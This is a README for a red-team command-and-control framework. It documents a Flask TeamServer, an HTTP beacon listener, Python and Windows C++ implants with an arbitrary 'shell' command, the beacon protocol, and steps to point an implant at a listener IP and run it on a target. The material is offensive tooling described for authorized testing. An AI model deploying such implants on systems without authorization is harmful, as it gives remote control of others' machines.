# C2 Framework

A Command & Control (C2) framework for authorized penetration testing and red team operations. Consists of a Python/Flask TeamServer, an HTTP listener that agents phone home to, cross-platform implants (Python and C++/Windows), and a React operator UI.

> **Legal notice** — Only use against systems you own or have explicit written authorization to test.

---

## Architecture

```
Operator Browser
      │
      │  HTTP REST  (port 8000)
      ▼
┌─────────────┐
│  TeamServer │  Flask API — manages agents, tasks, results, listeners
└──────┬──────┘
       │  shared in-memory AgentService (singleton)
       ▼
┌──────────────┐
│ HTTPListener │  Python HTTPServer — agent beacon handler  (default port 8080)
└──────┬───────┘
       │  HTTP POST every 5 s
       ▼
  Agent (Python / C++ Windows)
```

**Communication flow per beacon:**
1. Agent sends `POST /` with `Authorization: Bearer <base64(metadata_json)>` and body `{"results": "<base64(json_array)>"}`.
2. Listener registers the agent (first beacon) or updates `lastseen` + stores results.
3. Listener responds with `{"tasks": [...]}` — agent executes each task, queues results for next beacon.

---

## Components

### TeamServer (`TeamServer/`)

Flask REST API consumed by the operator frontend and the HTTP listener.

| File | Purpose |
|------|---------|
| `main.py` | App factory, registers blueprints, runs on port 8000 |
| `Controllers/agent_controller.py` | Agent CRUD + task/result endpoints |
| `Controllers/listeners_controller.py` | Listener lifecycle endpoints |
| `Services/agent_service.py` | Thread-safe in-memory agent store (singleton) |
| `Services/listeners_service.py` | In-memory listener store (singleton) |
| `Models/Agent/` | `Agent`, `AgentMetadata`, `Task`, `TaskResult` |
| `Models/Listener/` | `Listener` ABC, `HTTPListener`, `HTTPRequestHandler` |

### Python Agent (`Agent/`)

Cross-platform implant (Linux / macOS).

| File | Purpose |
|------|---------|
| `main.py` | Entry point — generates metadata, starts worker thread + comms loop |
| `Models/Agent.py` | Task queue, result queue, command dispatch |
| `Models/AgentMetadata.py` | Beacon metadata (id, hostname, username, …) |
| `Models/Task.py` / `TaskResult.py` | Task and result data classes |
| `Models/Commands/` | Built-in command implementations |
| `Modules/httpcomm.py` | HTTP communication module — beacons every 5 s |

**Built-in commands**

| Command | Description |
|---------|-------------|
| `pwd` | Print working directory |
| `cd <path>` | Change directory |
| `ls [path]` | List directory |
| `shell <cmd…>` | Run arbitrary shell command via `subprocess` |
| `ps` | List processes |
| `mkdir` / `rmdir` | Directory operations |

### Windows Agent (`AgentWindows/`)

C++ Visual Studio project targeting Windows.

| File | Purpose |
|------|---------|
| `main.cpp` | Entry point — spawns worker thread, starts comms loop |
| `Agent.cpp/.h` | Task queue, result queue, command dispatch |
| `HTTPCommunicationModule.cpp/.h` | HTTP beaconing (WinHTTP) |
| `HttpClient.cpp/.h` | Low-level WinHTTP wrapper |
| `Helpers.cpp/.h` | Base64, JSON helpers, system-info functions |
| `Commands.h` | Command function declarations |
| `Whoami.cpp`, `Shell.cpp`, `Run.cpp`, `Pwd.cpp`, `Cd.cpp`, `Ls.cpp` | Built-in command implementations |

### Frontend (`c2-frontend/`)

React 19 + TypeScript operator interface. See [`c2-frontend/CLAUDE.md`](c2-frontend/CLAUDE.md) for development guidance.

| Route | Component | Purpose |
|-------|-----------|---------|
| `/` | `Dashboard` | Live overview — agents + listeners, auto-refreshes every 30 s |
| `/agents` | `Agents` | Agent table with status dots, check-in, delete |
| `/agent/:id` | `AgentDetail` | Terminal-style console — send tasks, poll results every 5 s |
| `/listeners` | `Listeners` | Create / remove HTTP listeners |

---

## Prerequisites

### TeamServer & Python Agent
- Python 3.12+
- pip packages: `flask`, `flask-cors`, `flasgger`, `requests`

```bash
pip install flask flask-cors flasgger requests
```

### Windows Agent
- Visual Studio 2022 (or later)
- Windows SDK (for WinHTTP, process token APIs)
- Open `AgentWindows/AgentWindows.sln` and build in Release/x64

### Frontend
- Node.js 18+ / npm

```bash
cd c2-frontend
npm install
```

---

## Running

### 1. Start the TeamServer

```bash
cd TeamServer
python main.py
# Listening on http://0.0.0.0:8000
# Swagger UI: http://localhost:8000/apidocs
```

### 2. Create a listener via the UI (or curl)

Open the frontend (step 4) and go to **Listeners → Create**, or:

```bash
curl -X POST http://localhost:8000/listeners/create \
  -H "Content-Type: application/json" \
  -d '{"name": "http1", "type": "http", "port": 8080}'
```

This starts a Python `HTTPServer` on the chosen port that agents beacon to.

### 3. Deploy an agent

**Python agent (Linux/macOS):**

Edit `Agent/main.py` and set the TeamServer listener address/port, then:

```bash
cd Agent
python main.py
```

**Windows agent:**

Edit `AgentWindows/AgentWindows/main.cpp` — update the IP address and port passed to `HTTPCommunicationModule`, build, and run on the target.

```cpp
HTTPCommunicationModule* comm = new HTTPCommunicationModule("192.168.1.10", 8080, agent);
```

### 4. Start the operator UI

```bash
cd c2-frontend
npm start
# Opens http://localhost:3000
```

---

## Configuration

All configuration is currently hardcoded. Key values to change before deployment:

| Location | Setting | Default |
|----------|---------|---------|
| `TeamServer/main.py:28` | TeamServer API port | `8000` |
| `Agent/main.py:25` | Listener host | `localhost` |
| `Agent/main.py:25` | Listener port | `8080` |
| `AgentWindows/main.cpp:18` | Listener host | `172.16.97.1` |
| `AgentWindows/main.cpp:18` | Listener port | `8080` |
| `c2-frontend/src/services/api.ts:34` | TeamServer base URL | `http://localhost:8000` |

---

## TeamServer API Reference

Base URL: `http://localhost:8000`  
Interactive docs: `http://localhost:8000/apidocs`

### Agents

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/agents/` | List all agents |
| `GET` | `/agents/{id}` | Get agent by ID |
| `POST` | `/agents/` | Register an agent (body: metadata JSON) |
| `DELETE` | `/agents/{id}` | Remove agent |
| `POST` | `/agents/{id}/checkin` | Mark agent as seen now |
| `POST` | `/agents/{id}/checkout` | Clear agent last-seen timestamp |
| `POST` | `/agents/{id}/task` | Queue a task `{command, arguments, file?}` |
| `GET` | `/agents/{id}/tasks` | List all queued tasks |
| `GET` | `/agents/{id}/results` | List all task results |
| `GET` | `/agents/{id}/results/{task_id}` | Get result for a specific task |

### Listeners

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/listeners/` | List all active listeners |
| `GET` | `/listeners/{name}` | Get listener by name |
| `POST` | `/listeners/create` | Create & start listener `{name, type, port}` |
| `DELETE` | `/listeners/remove` | Stop & remove listener `{name}` |

### Agent Beacon Protocol (port 8080 by default)

Agents communicate with the **HTTPListener**, not the TeamServer API directly.

```
POST /
Authorization: Bearer <base64(metadata_json)>
Content-Type: application/json

{"results": "<base64(json_array_of_task_results)>"}
```

Response:
```json
{"tasks": [{"id": 1234, "command": "whoami", "arguments": [], "file": ""}]}
```

---

## Adding a New Command

### Python Agent

1. Create `Agent/Models/Commands/MyCommand.py`:

```python
from Models.Command import Command
from Models.Task import Task

class MyCommand(Command):
    def __init__(self):
        self.name = "mycommand"

    def execute(self, task: Task) -> str:
        # task.get_arguments() → List[str]
        return "result"
```

The agent auto-discovers all `Command` subclasses via `pkgutil` — no registration needed.

### Windows Agent

1. Declare in `Commands.h`: `std::string MyCommand(std::vector<std::string> arguments);`
2. Implement in a new `.cpp` file.
3. Register in `Agent.cpp → loadCommands()`: `commands["mycommand"] = &MyCommand;`

---

## Project Structure

```
C2/
├── README.md
├── .gitignore
├── TeamServer/
│   ├── main.py
│   ├── Controllers/
│   │   ├── agent_controller.py
│   │   └── listeners_controller.py
│   ├── Services/
│   │   ├── agent_service.py        # thread-safe singleton
│   │   └── listeners_service.py    # singleton
│   └── Models/
│       ├── Agent/
│       │   ├── agent.py
│       │   ├── agent_metadata.py
│       │   ├── task.py
│       │   └── task_result.py
│       └── Listener/
│           ├── listener.py         # ABC
│           └── http_listener/
│               ├── httplistener.py
│               └── http_handler.py
├── Agent/                          # Python agent (Linux/macOS)
│   ├── main.py
│   ├── Models/
│   │   ├── Agent.py
│   │   ├── AgentMetadata.py
│   │   ├── Command.py
│   │   ├── Task.py
│   │   ├── TaskResult.py
│   │   └── Commands/
│   │       ├── CdCommand.py
│   │       ├── LsCommand.py
│   │       ├── PwdCommand.py
│   │       ├── ShellCommand.py
│   │       ├── PsCommand.py
│   │       ├── MkdirCommand.py
│   │       └── RmdirCommand.py
│   └── Modules/
│       ├── comm.py                 # CommunicationModule ABC
│       └── httpcomm.py             # HTTP beacon loop
├── AgentWindows/                   # C++ Windows agent
│   └── AgentWindows/
│       ├── main.cpp
│       ├── Agent.cpp/.h
│       ├── HTTPCommunicationModule.cpp/.h
│       ├── HttpClient.cpp/.h
│       ├── Helpers.cpp/.h
│       ├── Commands.h
│       └── *.cpp                   # command implementations
└── c2-frontend/                    # React operator UI
    ├── src/
    │   ├── App.tsx
    │   ├── theme.ts
    │   ├── services/api.ts
    │   └── components/
    │       ├── Dashboard.tsx
    │       ├── Agents.tsx
    │       ├── AgentDetail.tsx
    │       ├── Listeners.tsx
    │       ├── Sidebar.tsx
    │       └── StatusBar.tsx
    └── CLAUDE.md
```
